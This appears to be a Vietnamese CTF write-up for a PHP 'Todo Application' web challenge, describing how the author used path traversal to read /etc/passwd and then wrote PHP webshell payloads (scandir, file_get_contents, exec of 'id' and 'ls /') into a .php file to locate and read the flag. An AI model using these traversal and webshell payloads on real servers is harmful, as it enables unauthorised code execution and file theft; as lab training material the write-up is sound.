---
title: Write-Up Todo Application
date: 2023-10-05 18:34:01 +0700
categories: [CTF, Cookie Hân Hoan, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
ĐỊA CHỈ: [https://battle.cookiearena.org/challenges/web/todo-application](https://battle.cookiearena.org/challenges/web/todo-application)

## **Challenge Details**

All your work will be saved to a checklist in the todo.txt file. Can a PHP Web Shell be created on this server? Could you try and read FLAG? (Chắc lại phải RCE ời).

- **Flag Location: /flagXXXX.txt**
- **Flag Format: CHH{XXX}**
- **Credits: YesWeHack**

## **Tags**

- Code Injection
- PHP
- YesWeHack

## ****Web Analysis:****

Tại `/` trang web:

Quan sát ta thấy 1 ô input và 1 đoạn code PHP hmm.

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled.png)

Mình thử nhập bất kì vào ô input và ấn enter.

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%201.png)

Ta quan sát thấy và rằng xuất hiện 2 parameter `?add` và `&fileTodo` 

Hiểu nhanh là `?add=input_strings` và  `&fileTodo=_input_file` —> **+1 idea test bug path traversal**

## ****Source Code Analysis:****

Này không copy được code nên mình giải thích nhanh nhé:

khai báo biến $file với giá trị là todo.txt khi input ta nhập vào checkbox và nó sẽ set vào param là ?add + với $file là todo.txt.

Nên bất kì mình nhập vào ô input thì nó đều ghi vào file.

Nhưng đoạn code không có thêm blacklist hay whitelist kiểm tra về ghi mã độc và kiểm tra đuôi file. Nên đều này có thể dẫn đến hacker có thể ghi 1 file webshell vào input và đỗi đuôi file từ .txt sang .php dẫn dến có thể RCE hệ thống.

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%202.png)

yaaa kiểm chứng nào.

## ****Exploiting Code Injection, Path traversal:****

Chứng minh có bug path traversal ( Là 1 hacker giỏi không bao giờ bỏ sót bugs, dù nó không có Flag trong đó nhưng vẫn check nhé).

### Cách 1: sử dụng hàm scandir và file_get_contents

Gói tin ban đầu.

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%203.png)

Thử thêm ../../etc/passwd vào $filetodo xem có được hay không nhé.

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%204.png)

Bèm có bugs path traversal luôn, lòi luôn cái path file index.php 🙂 (do file flag random nên không xem được bằng lỗi này, phải RCE thôi)

đoạn code trong cái ảnh ở trên nè

`/var/www/app/index.php`

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%205.png)

Chứng minh ghi được code php và thay đỗi đuôi file.

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%206.png)

Ghi vào khi báo bugs gì giờ test `/info.php` xem. 

Tèn ten được luôn đây này, giờ thì làm cái file shell và đọc file flag thôi nhỉ?

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%207.png)

Nhưng mình test 7749 cách ghi shell nhưng phát hiện bị disable funtions nên hết ghi được file shell
(à không phải hết mà do test thiếu case 🙂 nó sẽ ở cách 2 nhé, giờ mình chỉ cách bị disable funtions)

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%208.png)

Tuy vậy mình phát hiện ra rằng nó không hề disable `file_get_contents` và `scandir` .

- `scandir` : liệt kê tất cả các file (giống cmd ls trên ls)
- `file_get_contents` : đọc file

Giờ code nhẹ nhé

Search google về scandir thì có sẵn rồi : [ở đây nè](https://www.w3schools.com/php/func_directory_scandir.asp)

ở khúc bug path traversal ấy, ../../../ 3 lần là quay về thư mục gốc nên sửa lại trong này để liệt kê các file ở thư mục gốc nhé.

Payload: 

```php
<?php
$dir = "../../../";
$a = scandir($dir);
print_r($a);
?>
```

Lười ghi nên copy past qua đây cho lẹ

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%209.png)

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2010.png)

Send và đọc file `1.php`

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2011.png)

1 file pha ke và 1 file real.

biết được tên file flag rồi thì dùng `file_get_contents` đọc ra thôi.

Payload:

```php
<?php
$dir = "../../../";
$a = scandir($dir);
$b =file_get_contents("../../../flagqsBKh.txt");
print_r($a);
print_r($b);
?>
```

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2012.png)

DONE cách 1

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2013.png)

### Cách 2: sử dụng hàm EXEC RCE.

Mình đã test thiếu case này do không khai báo biến. Để rồi mò luôn cả CVE của php lạc hướng luôn :<

Bình thường mình test webshell sẽ kiểu như này.

```php
<?php exec(id); ?>
```

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2014.png)

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2015.png)

Nó không cho in ra, nên mình đã loại trừ nó nhanh chóng để test case khác.

Nhưng mình đã sai, giờ cũng sửa nhé.

Vì trang web hình như không cho `echo` ra trực tiếp nên mình sẽ khai báo biến và test lại.

Payload:

```php
<?php
$a = exec(id);
echo($a)
?>
```

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2016.png)

![Untitled](/assets/writeup/cookie/TodoApplication/Untitled%2017.png)

Giờ thì thực thi webshell bình thường

```php
<?php
$a = exec('ls /');
echo($a)
?>
```

Xem file và cat file nhé

donee =)))

Cảm ơn các bạn đã xem write up của mình =)) có góp ý hay thắc mắc add mình qua discord nha 

id discord : `ren6806`